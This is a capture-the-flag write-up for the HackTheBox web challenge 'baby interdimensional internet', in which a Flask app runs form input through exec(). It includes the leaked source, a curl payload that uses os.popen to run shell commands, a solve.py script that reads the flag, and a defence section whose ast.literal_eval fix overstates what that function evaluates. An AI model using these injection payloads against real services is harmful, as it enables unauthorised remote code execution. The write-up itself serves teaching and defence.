---
title: "baby interdimensional internet"
date: 2027-04-11 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, code-injection, rce, python, flask, cwe-94]
description: "An Easy Web challenge that hands you its own source through a /debug route, then runs your form input straight through Python's exec(). A calculator that evaluates arbitrary Python is no calculator at all — set a variable to any expression and the app reflects the result back, turning a math toy into full remote code execution."
---

## Overview

baby interdimensional internet is an Easy HackTheBox **Web** challenge (Rick-and-Morty-flavoured, container-based). It presents a Flask "calculator" that displays a single number, plus a quiet `<!-- /debug -->` hint in the HTML. The path to the flag is a textbook [server-side code injection](https://cwe.mitre.org/data/definitions/94.html): the app builds a string from two attacker-controlled form fields and feeds it to Python's `exec()`, with the result reflected straight back to the page.

## The technique

The page header reads `Werkzeug/1.0.0 Python/2.7.17`, and the `/debug` route returns the application's own source via `open(__file__).read()`. That single source leak gives away everything:

```python
def calc(recipe):
    global garage
    garage = {}
    try: exec(recipe, garage)        # the sink
    except: pass

# on a POST:
ingredient = request.form.get('ingredient', '')
recipe = '%s = %s' % (ingredient, request.form.get('measurements', ''))
calc(recipe)
if garage.get(ingredient, ''):
    return render_template('index.html', calculations=garage[ingredient])
```

Both `ingredient` and `measurements` come from the POST form. The app string-formats them into `"<ingredient> = <measurements>"` and runs it through `exec()` at module scope — no sandbox, full builtins. So `measurements` is *raw Python source*. Set `ingredient` to a variable name and `measurements` to any expression; after `exec`, the app reflects `garage[ingredient]` back, giving a convenient read channel for the result.

## Solution

First, confirm code execution and locate the flag with an `os.popen` listing:

```bash
curl -s -X POST "http://<target>:<port>/" \
  --data-urlencode "ingredient=x" \
  --data-urlencode "measurements=__import__('os').popen('id; ls -la /app').read()"
```

That shows the web user and reveals `/app/flag`. Reading it is then a one-liner. The durable artifact, `solve.py`:

```python
#!/usr/bin/env python3
import sys, re, requests
T = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:1337"

def run(py):
    r = requests.post(T + "/", data={"ingredient": "x", "measurements": py},
                       headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
    return r.text

html = run("open('/app/flag').read().strip()")
m = re.search(r'HTB\{[^}]*\}', html)
print(m.group(0) if m else html)
```

```bash
$ python3 solve.py http://<target>:<port>
HTB{...}
```

Flag value redacted — re-derive it live by running `solve.py` against your instance.

## Why it worked

Passing a string built from user input to `exec()`/`eval()`/`compile()` is unconditional remote code execution — unlike SQL or HTML there is no "escaping" that makes it safe, because the data *is* the program. The calculator's reflect-the-result feature turned a blind `exec` into an output oracle, so the flag came straight back in the response with no out-of-band channel needed. The `/debug` route disclosing the source just made the sink trivial to find.

## Fix / defense

- Never feed user input to `exec`/`eval`/`compile`. For arithmetic, tokenise and evaluate against an allowlist of numbers and operators, or use `ast.literal_eval()` (which rejects calls and names):

```python
import ast
def calc(expr):
    return ast.literal_eval(expr)   # numbers/operators only; no calls, no names
```

- Remove source-disclosing debug routes (`open(__file__).read()`) from production.
- Run the service as a low-privilege user and drop `os`/`subprocess` from any restricted namespace.

As the flag itself puts it: *never trusting user input again.*
